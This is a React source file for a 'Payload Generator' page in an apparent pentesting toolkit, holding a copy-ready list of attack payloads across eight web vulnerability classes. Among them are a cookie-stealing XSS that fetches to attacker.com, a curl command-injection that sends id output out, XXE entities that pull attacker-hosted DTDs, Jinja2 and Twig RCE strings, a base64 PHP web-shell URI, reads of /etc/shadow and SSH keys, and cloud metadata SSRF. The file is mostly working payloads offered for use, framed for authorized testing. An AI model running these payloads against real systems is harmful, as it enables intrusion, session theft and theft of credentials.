import React, { useState } from "react";
import { usePersistedState } from "@/hooks/usePersistedState";

interface PayloadCategory {
  key: string;
  label: string;
  description: string;
  color: string;
  payloads: { name: string; payload: string; note?: string }[];
}

const CATEGORIES: PayloadCategory[] = [
  {
    key: "xss",
    label: "XSS",
    description: "Cross-Site Scripting test payloads",
    color: "text-orange-400",
    payloads: [
      { name: "Basic Script Tag",         payload: `<script>alert(1)</script>` },
      { name: "Image onerror",            payload: `<img src=x onerror=alert(1)>` },
      { name: "SVG onload",               payload: `<svg onload=alert(1)>` },
      { name: "Body tag",                 payload: `<body onload=alert(1)>` },
      { name: "JavaScript URI",           payload: `javascript:alert(1)` },
      { name: "DOM XSS (innerHTML)",      payload: `<div id=x></div><script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>` },
      { name: "Double-encoded",           payload: `%3Cscript%3Ealert(1)%3C/script%3E` },
      { name: "Angle bracket bypass",     payload: `\u003cscript\u003ealert(1)\u003c/script\u003e` },
      { name: "Cookie theft",             payload: `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`, note: "Replace attacker.com" },
      { name: "Event handler polyglot",   payload: `" onmouseover=alert(1) x="` },
      { name: "Template literal",         payload: "`${alert(1)}`" },
      { name: "MathML",                   payload: `<math><maction actiontype="statusline#x" xlink:href="javascript:alert(1)">click</maction></math>` },
    ],
  },
  {
    key: "sqli",
    label: "SQL Injection",
    description: "SQL injection detection and exploitation payloads",
    color: "text-red-400",
    payloads: [
      { name: "Boolean true",             payload: `' OR '1'='1` },
      { name: "Boolean true (comment)",   payload: `' OR 1=1--` },
      { name: "Union 1 col",              payload: `' UNION SELECT NULL--` },
      { name: "Union 2 cols",             payload: `' UNION SELECT NULL,NULL--` },
      { name: "Union 3 cols",             payload: `' UNION SELECT NULL,NULL,NULL--` },
      { name: "Error-based (MySQL)",      payload: `' AND extractvalue(1,concat(0x7e,version()))--` },
      { name: "Error-based (MSSQL)",      payload: `' AND 1=convert(int,(select top 1 table_name from information_schema.tables))--` },
      { name: "Time-based (MySQL)",       payload: `'; SELECT SLEEP(5)--`, note: "Look for 5s delay" },
      { name: "Time-based (MSSQL)",       payload: `'; WAITFOR DELAY '0:0:5'--`, note: "Look for 5s delay" },
      { name: "Stacked queries",          payload: `'; INSERT INTO users(name) VALUES('hacked');--` },
      { name: "Column enum",              payload: `' ORDER BY 1--` },
      { name: "Version disclosure",       payload: `' UNION SELECT @@version,NULL--` },
    ],
  },
  {
    key: "cmdi",
    label: "Command Injection",
    description: "OS command injection test payloads",
    color: "text-yellow-400",
    payloads: [
      { name: "Semicolon separator",      payload: `; id` },
      { name: "Pipe",                     payload: `| id` },
      { name: "AND operator",             payload: `&& id` },
      { name: "OR operator",              payload: `|| id` },
      { name: "Backtick",                 payload: "`id`" },
      { name: "Subshell $(...)",          payload: `$(id)` },
      { name: "Newline",                  payload: `\nid` },
      { name: "Windows ipconfig",         payload: `& ipconfig /all` },
      { name: "Time-based blind",         payload: `; sleep 5`, note: "Look for 5s delay" },
      { name: "Out-of-band (curl)",       payload: `; curl http://attacker.com/$(id)`, note: "Replace attacker.com" },
      { name: "Nested quotes",            payload: `; echo "pwned"` },
      { name: "Null byte",               payload: `%00; id` },
    ],
  },
  {
    key: "lfi",
    label: "LFI / Path Traversal",
    description: "Local file inclusion and directory traversal payloads",
    color: "text-blue-400",
    payloads: [
      { name: "Linux /etc/passwd",        payload: `../../../etc/passwd` },
      { name: "Linux /etc/shadow",        payload: `../../../../etc/shadow` },
      { name: "Double encoding",          payload: `..%2F..%2F..%2Fetc%2Fpasswd` },
      { name: "URL encoded",              payload: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` },
      { name: "Null byte bypass",         payload: `../../../etc/passwd%00` },
      { name: "Windows SAM",             payload: `..\\..\\..\\windows\\system32\\drivers\\etc\\hosts` },
      { name: "PHP filter (source)",      payload: `php://filter/read=convert.base64-encode/resource=index.php` },
      { name: "PHP data execute",         payload: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`, note: "data:// LFI to RCE" },
      { name: "SSH auth keys",            payload: `../../../../root/.ssh/authorized_keys` },
      { name: "Apache access log",        payload: `../../../../var/log/apache2/access.log` },
    ],
  },
  {
    key: "ssrf",
    label: "SSRF",
    description: "Server-Side Request Forgery payloads",
    color: "text-cyan-400",
    payloads: [
      { name: "Localhost HTTP",           payload: `http://127.0.0.1/` },
      { name: "Localhost HTTPS",          payload: `https://127.0.0.1/` },
      { name: "AWS Metadata",             payload: `http://169.254.169.254/latest/meta-data/` },
      { name: "GCP Metadata",             payload: `http://metadata.google.internal/computeMetadata/v1/` },
      { name: "Azure Metadata",           payload: `http://169.254.169.254/metadata/instance?api-version=2019-06-01` },
      { name: "IPv6 localhost",           payload: `http://[::1]/` },
      { name: "Decimal IP",              payload: `http://2130706433/` },
      { name: "Hex IP",                   payload: `http://0x7f000001/` },
      { name: "DNS rebind",               payload: `http://localtest.me/` },
      { name: "File protocol",            payload: `file:///etc/passwd` },
      { name: "Gopher protocol",          payload: `gopher://127.0.0.1:6379/_INFO` },
    ],
  },
  {
    key: "xxe",
    label: "XXE",
    description: "XML External Entity injection payloads",
    color: "text-pink-400",
    payloads: [
      {
        name: "Classic file read",
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
      },
      {
        name: "SSRF via XXE",
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>`,
        note: "Replace attacker.com",
      },
      {
        name: "Blind XXE (DNS OOB)",
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo/>`,
        note: "Replace attacker.com",
      },
      {
        name: "Parameter entity",
        payload: `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><data/>`,
      },
    ],
  },
  {
    key: "ssti",
    label: "SSTI",
    description: "Server-Side Template Injection payloads",
    color: "text-violet-400",
    payloads: [
      { name: "Jinja2 / Twig detect",     payload: `{{7*7}}`, note: "Expect 49" },
      { name: "Jinja2 RCE",               payload: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` },
      { name: "Twig RCE",                 payload: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` },
      { name: "Freemarker detect",        payload: "${7*7}", note: "Expect 49" },
      { name: "Freemarker RCE",           payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}' },
      { name: "Velocity detect",          payload: "#set($x=7*7)${x}", note: "Expect 49" },
      { name: "Smarty detect",            payload: `{php}echo 7*7;{/php}`, note: "Expect 49" },
      { name: "ERB (Ruby) detect",        payload: `<%= 7*7 %>`, note: "Expect 49" },
    ],
  },
  {
    key: "open_redirect",
    label: "Open Redirect",
    description: "Open redirect bypass payloads",
    color: "text-teal-400",
    payloads: [
      { name: "Basic",                    payload: `https://evil.com` },
      { name: "Double slash",             payload: `//evil.com` },
      { name: "Backslash bypass",         payload: `\/\/evil.com` },
      { name: "CRLF injection",           payload: `https://evil.com%0d%0aLocation: https://evil.com` },
      { name: "URL with @",              payload: `https://safe.com@evil.com` },
      { name: "IPv6",                     payload: `http://[::1]@evil.com/` },
      { name: "Javascript redirect",      payload: `javascript:window.location='https://evil.com'` },
    ],
  },
];

export default function PayloadGen() {
  const [activeKey, setActiveKey]   = usePersistedState<string>("payloadgen-key", CATEGORIES[0].key);
  const [search, setSearch]         = usePersistedState<string>("payloadgen-search", "");
  const [copied, setCopied]         = useState<string | null>(null);

  const active = CATEGORIES.find(c => c.key === activeKey)!;

  const filtered = active.payloads.filter(p =>
    !search || p.name.toLowerCase().includes(search.toLowerCase()) || p.payload.toLowerCase().includes(search.toLowerCase())
  );

  function copy(text: string) {
    navigator.clipboard.writeText(text);
    setCopied(text);
    setTimeout(() => setCopied(null), 1500);
  }

  function copyAll() {
    const all = filtered.map(p => p.payload).join("\n");
    navigator.clipboard.writeText(all);
    setCopied("__all__");
    setTimeout(() => setCopied(null), 1500);
  }

  return (
    <div className="max-w-5xl mx-auto space-y-5">
      <div>
        <h1 className="text-2xl font-bold text-white">Payload Generator</h1>
        <p className="text-white/60 text-sm mt-1">
          Curated test payloads for XSS · SQLi · Command Injection · LFI · SSRF · XXE · SSTI · Open Redirect — Metasploit payload-gen equivalent
        </p>
      </div>

      {/* Category tabs */}
      <div className="flex flex-wrap gap-2">
        {CATEGORIES.map(c => (
          <button
            key={c.key}
            onClick={() => { setActiveKey(c.key); setSearch(""); }}
            className={`px-3 py-1.5 rounded-lg text-xs font-semibold border transition-colors ${
              activeKey === c.key
                ? "border-primary/50 bg-primary/10 text-primary"
                : "border-white/10 bg-white/[0.03] text-white/50 hover:text-white hover:border-white/20"
            }`}
          >{c.label}</button>
        ))}
      </div>

      {/* Category header + search */}
      <div className="bg-white/[0.04] border border-white/10 rounded-xl p-4 space-y-3">
        <div className="flex items-center justify-between flex-wrap gap-3">
          <div>
            <div className={`text-sm font-bold ${active.color}`}>{active.label}</div>
            <div className="text-xs text-white/40 mt-0.5">{active.description}</div>
          </div>
          <div className="flex items-center gap-2">
            <input
              className="bg-black/30 border border-white/10 rounded-lg px-3 py-1.5 text-xs text-white/80 focus:outline-none focus:border-primary/40 w-40"
              placeholder="Search payloads…"
              value={search}
              onChange={e => setSearch(e.target.value)}
            />
            <button
              onClick={copyAll}
              className="px-3 py-1.5 text-xs font-semibold bg-white/[0.07] border border-white/10 text-white/70 hover:text-white rounded-lg transition-colors"
            >
              {copied === "__all__" ? "Copied all!" : `Copy all (${filtered.length})`}
            </button>
          </div>
        </div>

        <div className="space-y-2">
          {filtered.map((p, i) => (
            <div key={i} className="group flex items-start gap-3 bg-black/20 border border-white/[0.06] rounded-lg p-3 hover:border-white/15 transition-colors">
              <div className="flex-1 min-w-0 space-y-1">
                <div className="flex items-center gap-2 flex-wrap">
                  <span className="text-xs font-semibold text-white/80">{p.name}</span>
                  {p.note && (
                    <span className="text-xs text-yellow-400/60 italic">{p.note}</span>
                  )}
                </div>
                <code className="block text-xs font-mono text-green-400/80 whitespace-pre-wrap break-all">{p.payload}</code>
              </div>
              <button
                onClick={() => copy(p.payload)}
                className="shrink-0 text-xs text-white/30 group-hover:text-white/60 bg-white/[0.04] hover:bg-white/[0.09] px-2 py-1 rounded transition-colors"
              >
                {copied === p.payload ? "✓" : "Copy"}
              </button>
            </div>
          ))}
          {filtered.length === 0 && (
            <div className="text-center text-white/30 text-sm py-6">No payloads match your search.</div>
          )}
        </div>
      </div>

      <div className="text-xs text-white/25 text-center">
        These payloads are for authorized security testing only. Never use against systems you don't own or have written permission to test.
      </div>
    </div>
  );
}
